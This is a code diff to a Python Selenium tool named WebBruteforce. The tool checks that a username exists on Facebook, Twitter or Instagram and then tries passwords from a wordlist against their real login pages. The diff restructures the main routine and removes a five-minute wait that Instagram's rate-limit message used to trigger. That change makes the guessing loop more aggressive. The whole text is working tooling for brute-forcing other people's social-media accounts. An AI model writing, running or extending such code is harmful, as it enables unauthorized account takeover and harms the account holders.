@@ -34,14 +34,15 @@ class WebBruteforce(object):
         self.wordlist = wordlist
         self.delay = delay
 
+    def execute(self):
         print P + "[*] Checking if username exists..." + W
-        self.usercheck(self.username, self.service)
-        if self.usercheck(username, service) == 1:
+        if self.usercheck(self.username, self.service) == 1:
             print R + "[!] The username was not found! Exiting..." + W
             exit()
         print G + "[*] Username found! Continuing..." + W
         sleep(1)
-        self.webBruteforce(username, wordlist, service, delay)
+        print "Using %s seconds of delay. Default is 1 second" % self.delay
+        self.webBruteforce(self.username, self.wordlist, self.service, self.delay)
 
     def usercheck(self, username, service):
         driver = webdriver.Firefox()
@@ -68,7 +69,7 @@ class WebBruteforce(object):
             driver.get("https://touch.facebook.com/login?soft=auth/")
         elif service == "twitter":
             driver.get("https://mobile.twitter.com/session/new")
-            sleep(delay * 2)
+            sleep(delay * 2) # wait for DOM to render
         elif service == "instagram":
             driver.get("https://www.instagram.com/accounts/login/?force_classic_login")
 
@@ -108,9 +109,6 @@ class WebBruteforce(object):
                     assert (("Twitter") in driver.title)
                 elif service == "instagram":
                     assert (("Log in — Instagram") in driver.title)
-                    if TIMEOUT in driver.page_source:
-                        print O + "[!] Timeout raised! Waiting... [!]" + W
-                        sleep(300)
                 
                 print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
                 sleep(delay)
